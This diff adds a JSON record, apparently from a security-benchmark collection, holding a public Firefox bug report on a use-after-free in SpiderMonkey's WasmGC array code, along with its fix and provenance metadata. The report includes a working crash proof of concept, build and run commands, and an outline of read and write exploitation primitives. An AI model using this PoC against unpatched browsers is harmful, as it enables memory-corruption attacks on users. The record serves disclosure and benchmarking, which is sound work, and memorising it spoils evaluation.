@@ -1,0 +1,161 @@
+{
+  "bug_id": "2013739",
+  "title": "Use-After-Free via Incorrect Forwarding Pointer in WasmArrayObject::obj_moved()",
+  "severity": "sec-high",
+  "keywords": [
+    "ai-involved",
+    "csectype-uaf",
+    "regression",
+    "reporter-external",
+    "sec-high"
+  ],
+  "product": "firefox",
+  "component": "JavaScript: WebAssembly",
+  "creation_time": "2026-02-01T06:11:52Z",
+  "resolution_time": "2026-02-09T21:32:39Z",
+  "bug_discussion": "Public Bugzilla report: https://bugzilla.mozilla.org/show_bug.cgi?id=2013739\n\n## Summary\n\nA bitwise operator error in `WasmArrayObject::obj_moved()` destroys the forwarding pointer for out-of-line (OOL) array data blocks during nursery garbage collection. Line 376 of `WasmGcObject.cpp` writes `uintptr_t(oolHeaderNew) & 1` instead of `uintptr_t(oolHeaderNew) | 1`, which always produces zero for aligned pointers. This causes `Instance::updateFrameForMovingGC()` to misclassify OOL data as inline, leaving a stale data pointer on the wasm stack. Subsequent array element accesses through the stale pointer read from freed nursery memory, producing a use-after-free condition. The bug is reachable from web content via WasmGC, which shipped enabled-by-default in Firefox 120. The vulnerable code was introduced in commit fcc2f20e35ec (2026-01-19) and is present in Firefox 149.0a1 (current Nightly).\n\n## Details\n\n| Field | Value |\n|-------|-------|\n| Component | js/src/wasm/WasmGcObject.cpp |\n| Function | `WasmArrayObject::obj_moved()` |\n| Vulnerable Line | 376 |\n| Consumer | `Instance::updateFrameForMovingGC()` (WasmInstance.cpp:3289) |\n| CWE | CWE-416 (Use After Free), CWE-682 (Incorrect Calculation) |\n| Introduced | Bug 1992888, commit fcc2f20e35ec (2026-01-19) |\n| Affected | Firefox 149.0a1 (mozilla-central / Nightly), all platforms |\n\n## Analysis\n\n### Vulnerable Code (WasmGcObject.cpp:362-378)\n\n```cpp\nif (oolHeaderNew != oolHeaderOld) {\n    // The OOL block has been moved.  Fix up the data pointer in the new\n    // object.\n    arrayNew.data_ = oolDataHeaderToDataPointer(oolHeaderNew);\n    // Set up forwarding for the OOL block.  Use direct forwarding.  Write the\n    // address of the new OOL block to OOLDataHeader::word in the old OOL\n    // block.  This will be later used by Instance::updateFrameForMovingGC.\n    //\n    // Note, > rather than >=, because the OOL block must be big enough to hold\n    // the data header plus at least one byte of array data.\n    MOZ_RELEASE_ASSERT(oolBlockSize > sizeof(OOLDataHeader));\n    if (nursery.isInside(oolHeaderOld)) {\n      // Store the forwarding word, with bit 0 set.\n      oolHeaderOld->word = uintptr_t(oolHeaderNew) & 1;    // <-- BUG\n      oolHeaderNew->word = WasmArrayObject::OOLDataHeader_Magic;\n    }\n}\n```\n\n### Consumer Code (WasmInstance.cpp:3281-3324)\n\n```cpp\ncase StackMap::Kind::ArrayDataPointer: {\n    uint8_t* oldDataPointer = (uint8_t*)stackWords[i];\n    if (WasmArrayObject::isDataInline(oldDataPointer)) {   // <-- takes this path\n      // Inline path: computes bogus WasmArrayObject pointer\n      WasmArrayObject* oldArray =\n          WasmArrayObject::fromInlineDataPointer(oldDataPointer);\n      WasmArrayObject* newArray =\n          (WasmArrayObject*)gc::MaybeForwarded(oldArray);\n      if (newArray != oldArray) {\n        stackWords[i] =\n            uintptr_t(WasmArrayObject::addressOfInlineArrayData(newArray));\n      }\n      // RESULT: stack pointer NOT updated (oldArray == newArray after\n      //         MaybeForwarded on a bogus pointer)\n    } else {\n      // OOL path: would correctly follow forwarding pointer\n      // ...\n      MOZ_ASSERT(oldHeader->word & 1);  // would assert-fail if reached\n      // ...\n    }\n    break;\n}\n```\n\n### Root Cause\n\nThe `isDataInline()` function (WasmGcObject.h:478-486) reads the `OOLDataHeader::word` field preceding the data pointer and checks `(headerWord & 1) == 0`. For inline arrays, this word is part of the object and has bit 0 clear. For OOL arrays, this word is `OOLDataHeader_Magic` (0x351), which has bit 0 set.\n\nDuring nursery GC, `obj_moved` is supposed to overwrite the old OOL header word with the forwarding pointer to the new location, with bit 0 set (`| 1`). The `& 1` typo produces zero for any aligned pointer, which is indistinguishable from an inline data header.\n\nWhen `updateFrameForMovingGC` later processes stack-cached `ArrayDataPointer` entries, it calls `isDataInline(oldDataPointer)`. The zeroed forwarding word causes `(0 & 1) == 0 == true`, taking the inline path. The inline path computes a bogus `WasmArrayObject*` via `fromInlineDataPointer`, which points into the middle of the freed OOL block. `MaybeForwarded` on this bogus pointer returns the same pointer (it's not a valid forwarded object), so the condition `newArray != oldArray` is false and the stack slot is not updated.\n\nThe wasm function then resumes execution with the stale data pointer, which points into freed nursery memory.\n\n### Ion Alias Analysis Dependency\n\nIon's `wasmCallAliasSet()` (MIR-wasm.h:1951-1957) explicitly excludes `WasmArrayDataPointer` from the set of memory locations clobbered by wasm calls:\n\n```cpp\nstatic AliasSet wasmCallAliasSet() {\n    // This is ok because:\n    // - numElements is immutable\n    // - the GC will rewrite any array data pointers on move\n    AliasSet exclude = AliasSet(AliasSet::WasmArrayNumElements) |\n                       AliasSet(AliasSet::WasmArrayDataPointer);\n    return AliasSet::Store(AliasSet::Any) & ~exclude;\n}\n```\n\nThis allows Ion's GVN pass to keep data pointer values alive across calls that may trigger GC. The comment \"the GC will rewrite any array data pointers on move\" documents the contract that this bug violates.\n\n## Proof of Concept\n\n### Test Environment\n\n- OS: Ubuntu (Linux 6.14.0-1018-aws)\n- Compiler: Mozilla clang (from mozbuild toolchain)\n- Target: mozilla-central commit 031c614e006f (2026-01-30)\n- Architecture: x86_64\n- JS Shell: SpiderMonkey 149.0a1, debug+optimize build\n\n### PoC Code\n\n```javascript\n// poc_wasm_fwd_web.js\n// Demonstrates UAF via WasmGcObject OOL forwarding pointer bug.\n// Uses only web-compatible APIs (no minorgc/gczeal/gcparam).\n\"use strict\";\n\n// GC trigger: pure JS allocation pressure fills nursery\nfunction triggerGCviaAlloc() {\n  let junk = [];\n  for (let i = 0; i < 50000; i++) {\n    junk.push({a: i, b: i + 1, c: [i, i + 1, i + 2]});\n  }\n  return junk.length;\n}\n\nconst wat = `\n(module\n  (type $i32arr (array (mut i32)))\n  (import \"env\" \"triggerGC\" (func $triggerGC (result i32)))\n\n  ;; 32 i32 elements = 128 bytes data > 112 (MaxInlineBytes) => OOL\n  ;; OOL block = 136 bytes <= 256 (MaxNurseryTrailerSize) => nursery-direct\n  (func (export \"test\") (result i32)\n    (local $arr (ref $i32arr))\n    (local.set $arr (array.new $i32arr (i32.const 0) (i32.const 32)))\n    (array.set $i32arr (local.get $arr) (i32.const 0) (i32.const 0xCAFEBABE))\n    (array.set $i32arr (local.get $arr) (i32.const 1) (i32.const 0xDEADBEEF))\n    (array.set $i32arr (local.get $arr) (i32.const 15) (i32.const 0xBAADF00D))\n    (array.set $i32arr (local.get $arr) (i32.const 31) (i32.const 0x1337C0DE))\n    ;; GC safepoint: Ion keeps data pointer live across this call\n    (drop (call $triggerGC))\n    ;; Reads via (potentially stale) data pointer\n    (i32.add\n      (i32.add\n        (array.get $i32arr (local.get $arr) (i32.const 0))\n        (array.get $i32arr (local.get $arr) (i32.const 1)))\n      (i32.add\n        (array.get $i32arr (local.get $arr) (i32.const 15))\n        (array.get $i32arr (local.get $arr) (i32.const 31))))\n  )\n)`;\n\nconst binary = wasmTextToBinary(wat);\nconst mod = new WebAssembly.Module(binary);\nconst inst = new WebAssembly.Instance(mod, {\n  env: { triggerGC: triggerGCviaAlloc }\n});\n\nconst expected = (0xCAFEBABE + 0xDEADBEEF + 0xBAADF00D + 0x1337C0DE) | 0;\n\n// Phase 1: lightweight warmup for Ion tier-up\nlet doGC = false;\nprint(\"Phase 1: warmup (100000 calls for Ion tier-up)...\");\nfor (let i = 0; i < 100000; i++) {\n  inst.exports.test();\n}\nprint(\"Phase 2: GC pressure after Ion tier-up...\");\nfor (let i = 0; i < 200; i++) {\n  try {\n    let r = inst.exports.test();\n    if (r !== expected) {\n      print(\"CORRUPTION at iter \" + i + \": 0x\" + (r >>> 0).toString(16));\n      break;\n    }\n  } catch(e) {\n    print(\"CRASH at iter \" + i + \": \" + e);\n    break;\n  }\n}\nprint(\"Done.\");\n```\n\n### Build and Run\n\n```bash\n# Build debug+optimize JS shell (assertions + Ion GVN active)\nmkdir -p obj-jsshell && cd obj-jsshell\n/path/to/firefox/js/src/configure --enable-debug --enable-optimize\nmake -j$(nproc)\n\n# Run PoC -- crashes with SIGSEGV\n./dist/bin/js poc_wasm_fwd_web.js\n\n# Alternatively, force Ion compilation for faster reproduction:\n./dist/bin/js --wasm-compiler=optimizing --test-wasm-await-tier2 poc_wasm_fwd_web.js\n```\n\n### Output\n\nWith `--wasm-compiler=optimizing` (immediate crash):\n\n```\nPhase 1: warmup (100000 calls for Ion tier-up)...\nPhase 2: GC pressure after Ion tier-up...\nSegmentation fault (core dumped)\n```\n\nExit code: 139 (SIGSEGV)\n\nWith default flags (natural tier-up):\n\n```\nPhase 1: warmup (100000 calls for Ion tier-up)...\nWarmup done. Ion should have compiled by now.\nPhase 2: GC pressure (200 iterations)...\nSegmentation fault (core dumped)\n```\n\nExit code: 139 (SIGSEGV)\n\n### Crash Configurations Validated\n\n| Compiler Flags | GC Trigger | Result |\n|---|---|---|\n| `--wasm-compiler=optimizing` | `minorgc()` (shell) | SIGSEGV (139) |\n| `--wasm-compiler=optimizing --test-wasm-await-tier2` | JS alloc pressure | SIGSEGV (139) |\n| Default (baseline + Ion) | `minorgc()` (shell) | SIGSEGV (139) |\n| Default (baseline + Ion) | JS alloc pressure only | SIGSEGV (139) |\n\n### Trigger Conditions\n\n1. WasmGC array with 29-62 `i32` elements (OOL storage, nursery-direct allocation)\n2. Ion compilation of the wasm function (natural tier-up or forced)\n3. Array element access before and after a call to an imported JS function\n4. Nursery GC during the imported call that relocates the OOL data block\n\n## Exploitation\n\n### Attack Path\n\n1. **Attacker serves a web page** containing a wasm module with a GC array type and an imported JS function.\n2. **Wasm function creates a 32-element `i32` array.** The 128-byte data block exceeds `WasmArrayObject_MaxInlineBytes` (112), forcing OOL allocation. The 136-byte OOL block is below `MaxNurseryTrailerSize` (256), so it is allocated directly in the nursery (not via `BufferAllocator`).\n3. **Wasm writes canary values** to the array. Ion loads the data pointer once and caches it for subsequent accesses (GVN optimization, enabled by `wasmCallAliasSet()` excluding `WasmArrayDataPointer`).\n4. **Wasm calls the imported JS function.** The cached data pointer survives the call on the stack/in a register.\n5. **JS function allocates objects** to fill the nursery, triggering a minor (nursery) GC.\n6. **GC promotes the `WasmArrayObject`** and relocates its OOL data block from nursery to tenured heap. `obj_moved` writes `oolHeaderOld->word = ptr & 1 = 0`.\n7. **`updateFrameForMovingGC` processes the stack.** It encounters the `ArrayDataPointer` stack map entry. `isDataInline(oldDataPointer)` reads the forwarding word (0), returns true. The inline path computes a bogus object pointer, `MaybeForwarded` returns the same pointer, and the stack slot is NOT updated.\n8. **Wasm resumes with the stale pointer** into freed nursery memory. Array reads produce attacker-influenced data (from objects allocated after the GC).\n\n### UAF Primitive\n\nThe stale pointer reads from nursery memory that has been freed and may be reallocated. The attacker controls what objects occupy the freed region by allocating JS objects after the GC. This provides:\n\n- **Read primitive**: Array element reads via the stale pointer return data from attacker-controlled JS objects in the recycled nursery space.\n- **Potential write primitive**: If the wasm function writes to the array after the GC (array.set), the write goes to freed/reused nursery memory, corrupting live JS objects.\n\n## Fix\n\n```cpp\n// Before (vulnerable) -- WasmGcObject.cpp:376:\noolHeaderOld->word = uintptr_t(oolHeaderNew) & 1;\n\n// After (fixed):\noolHeaderOld->word = uintptr_t(oolHeaderNew) | 1;\n```\n\nThe `| 1` sets bit 0 of the forwarding pointer, which is the documented protocol for OOL data header words. `isDataInline()` checks `(word & 1) == 0` to distinguish inline from OOL; the set bit 0 ensures the forwarding pointer is correctly classified as OOL by all consumers.\n\nThe `WasmStructObject::obj_moved` function (same file, line 497+) handles the analogous case for struct OOL data using `nursery.setForwardingPointerWhileTenuring`, which writes a `BufferRelocationOverlay` without manual bit manipulation. The array path was refactored in Bug 1992888 to use a custom forwarding protocol and introduced this typo.\n\nCreated attachment 9542046\n(secure)\n\n*** Bug 2014014 has been marked as a duplicate of this bug. ***\n\nIt sounds like Julian confirmed this.\n\nComment on attachment 9542046\n(secure)\n\n### Security Approval Request\n* **How easily could an exploit be constructed based on the patch?**: (I think I can land this without sec-approval, because this is a nightly-only bug; but requesting approval to be sure).\n\nIt would probably take some effort; but it may be possible, given that bug 2014014 -- which is a duplicate -- contains what is claims is a POC for an RCE exploit (which I haven't tried to verify).\n* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No\n* **Which branches (beta, release, and/or ESR) are affected by this flaw, and do the release status flags reflect this affected/unaffected state correctly?**: nightly only; status flags are correct\n* **If not all supported branches, which bug introduced the flaw?**: Bug 1992888\n* **Do you have backports for the affected branches?**: Yes\n* **If not, how different, hard to create, and risky will they be?**: n/a -- nightly only\n* **How likely is this patch to cause regressions; how much testing does it need?**: I have tested it locally as much as I reasonably can; and there is a standalone testcase (not in this patch, obviously) which also passes\n* **Is the patch ready to land after security approval is given?**: Yes\n* **Is Android affected?**: Yes\n\nCreated attachment 9543462\nBug 2013739 - testcase.  r=rhunt.\n\nhttps://phabricator.services.mozilla.com/D282337 is a test case,\nfor landing at some future point.\n\nComment on attachment 9542046\n(secure)\n\nsec-approval to land. This bug only affects nightly.\n\nPushed by jseward@mozilla.com:\nhttps://github.com/mozilla-firefox/firefox/commit/05ffcde977df\nhttps://hg.mozilla.org/integration/autoland/rev/4ed022ff9db5\nr=rhunt.\n\nhttps://hg.mozilla.org/mozilla-central/rev/4ed022ff9db5\n\nThis bug was filed within our bounty collision window of bug 2014014 so we are splitting the bounty award between both bugs\n\nPushed by jseward@mozilla.com:\nhttps://github.com/mozilla-firefox/firefox/commit/70eb3ed5fc26\nhttps://hg.mozilla.org/integration/autoland/rev/aa04376b00c3\ntestcase.  r=rhunt.\n\nhttps://hg.mozilla.org/mozilla-central/rev/aa04376b00c3",
+  "commit_ids": [
+    "05ffcde977dfaf75399cbcccf0cf966e46065a76"
+  ],
+  "fix_commit_sha": "05ffcde977dfaf75399cbcccf0cf966e46065a76",
+  "fix_date": "2026-02-09T11:18:44Z",
+  "season": "2026H1",
+  "mainline_verified": true,
+  "date_basis": "git_committer_date_on_captured_mainline",
+  "affected_files": [
+    "js/src/wasm/WasmGcObject.cpp"
+  ],
+  "changed_lines": 3,
+  "aliases": [
+    "Bug 2013739"
+  ],
+  "target_type": "spidermonkey_js_shell",
+  "report_references": [
+    {
+      "id": "2013739",
+      "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2013739",
+      "kind": "public_bugzilla_security_report"
+    },
+    {
+      "id": "poc-2013739",
+      "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2013739#c0",
+      "kind": "public_reporter_reproducer"
+    }
+  ],
+  "candidate_status": "attributed_upstream_fix_pending_security_review",
+  "security_screen": {
+    "status": "pending",
+    "preliminary_impact": "candidate_wasm_array_out_of_line_data_use_after_free",
+    "preliminary_boundary": "Page-supplied Wasm GC module and JavaScript allocation pressure; the reported defect affected Nightly before release",
+    "untrusted_input_boundary_proven": false,
+    "qualification_caveat": "Nightly-only upstream assessment; replay the exact reporter input and assess benchmark configuration eligibility",
+    "earliest_fix_review_required": true,
+    "three_version_replay_status": "not_run"
+  },
+  "provenance": {
+    "collector": "project_balance_firefox_2026h1_public_security_reports_v2",
+    "source_url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2013739",
+    "regressed_by_url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1992888",
+    "report_details": "fetched",
+    "raw_report": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/bugzilla/2013739.json",
+      "sha256": "a55422083101cc87ed90d9f7f58baf64c07885087a0a8b2f4194b5ef27e7edf8",
+      "bytes": 3787,
+      "url": "https://bugzilla.mozilla.org/rest/bug/2013739"
+    },
+    "raw_comments": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/bugzilla/2013739-comments.json",
+      "sha256": "1c8f8c8969d7c66bb13060ce40be3ec2012710dca0b404a9ac9a63b35f360389",
+      "bytes": 33057,
+      "url": "https://bugzilla.mozilla.org/rest/bug/2013739/comment"
+    },
+    "raw_attachment_index": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/bugzilla/2013739-attachments.json",
+      "sha256": "4ea3017ca7e7eac963ae9298c7e98f809df8f716226e636676da93b3dfce7f56",
+      "bytes": 1274,
+      "url": "https://bugzilla.mozilla.org/rest/bug/2013739/attachment?exclude_fields=data"
+    },
+    "raw_poc": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/poc/2013739-inline.js",
+      "sha256": "24dab5c6f6b908025a44590e046731b11519beabb79fcf450f377a4628d63957",
+      "bytes": 2310,
+      "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2013739#c0"
+    },
+    "test_evidence": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/poc/2013739-inline.js",
+      "sha256": "24dab5c6f6b908025a44590e046731b11519beabb79fcf450f377a4628d63957",
+      "bytes": 2310,
+      "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2013739#c0"
+    },
+    "reporter_auxiliary": null,
+    "commit_object": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/05ffcde977dfaf75399cbcccf0cf966e46065a76.commit",
+      "sha256": "f2dd298ab693c661e40e8da9eca99b0be69b9b83db2c728a26da00bddca77fee",
+      "bytes": 316
+    },
+    "patch": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/05ffcde977dfaf75399cbcccf0cf966e46065a76.patch",
+      "sha256": "3e0eee3007023e04c579d4adfae950dd4926fb4c22a2a1b673e048cb2cf21e90",
+      "bytes": 1021
+    },
+    "raw_git": {
+      "fix": {
+        "sha": "05ffcde977dfaf75399cbcccf0cf966e46065a76",
+        "commit": {
+          "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/05ffcde977dfaf75399cbcccf0cf966e46065a76.commit",
+          "sha256": "f2dd298ab693c661e40e8da9eca99b0be69b9b83db2c728a26da00bddca77fee",
+          "bytes": 316
+        },
+        "patch": {
+          "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/05ffcde977dfaf75399cbcccf0cf966e46065a76.patch",
+          "sha256": "3e0eee3007023e04c579d4adfae950dd4926fb4c22a2a1b673e048cb2cf21e90",
+          "bytes": 1021
+        }
+      },
+      "introduction": {
+        "sha": "fcc2f20e35ec811fd0d3c82286a00e68ffb265be",
+        "commit": {
+          "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/fcc2f20e35ec811fd0d3c82286a00e68ffb265be.commit",
+          "sha256": "5d9379c0deaa5531c28f3cfe933a7175e5b13b7d5301a1a41b670740b19015f1",
+          "bytes": 2620
+        },
+        "patch": {
+          "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/fcc2f20e35ec811fd0d3c82286a00e68ffb265be.patch",
+          "sha256": "fe55d3e4d5e22af256b1e2bd069d3bc40e6df18265c7f9a0842458eeb25a8e51",
+          "bytes": 57053
+        }
+      }
+    },
+    "mainline_ref": "refs/remotes/origin/main",
+    "mainline_tip": "1b0c8fac6e93715898d0c6b74ebbf18e4b8b0fe3",
+    "dedup_snapshot": {
+      "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/dedup/2013739.json",
+      "sha256": "6eb96365a5cdd9beec956e2b73910bd61d73c29e2450be6b47d089f928446378",
+      "bytes": 46310
+    },
+    "introduction_candidate": {
+      "sha": "fcc2f20e35ec811fd0d3c82286a00e68ffb265be",
+      "committer_date": "2026-01-19T10:27:07Z",
+      "files": 9,
+      "changed_lines": 694,
+      "repository_path": "js/src/wasm/WasmGcObject.cpp",
+      "blame_lines": "376,376",
+      "basis": "Bugzilla regressed_by 1992888 and the incorrect forwarding-word assignment at the fix parent blame to its January 2026 mainline commit",
+      "commit_object": {
+        "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/fcc2f20e35ec811fd0d3c82286a00e68ffb265be.commit",
+        "sha256": "5d9379c0deaa5531c28f3cfe933a7175e5b13b7d5301a1a41b670740b19015f1",
+        "bytes": 2620
+      },
+      "patch": {
+        "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/fcc2f20e35ec811fd0d3c82286a00e68ffb265be.patch",
+        "sha256": "fe55d3e4d5e22af256b1e2bd069d3bc40e6df18265c7f9a0842458eeb25a8e51",
+        "bytes": 57053
+      },
+      "blame": {
+        "path": "/research-data/secprbench/season100-20261004-project-balance/report-collection/firefox-2026h1-v3/raw/git/2013739-fix-parent-blame.txt",
+        "sha256": "3d44a5b63564f382d8522c8cc75b04f2fc36811e38539a1f0bb01bee18345bba",
+        "bytes": 530
+      }
+    }
+  }
+}
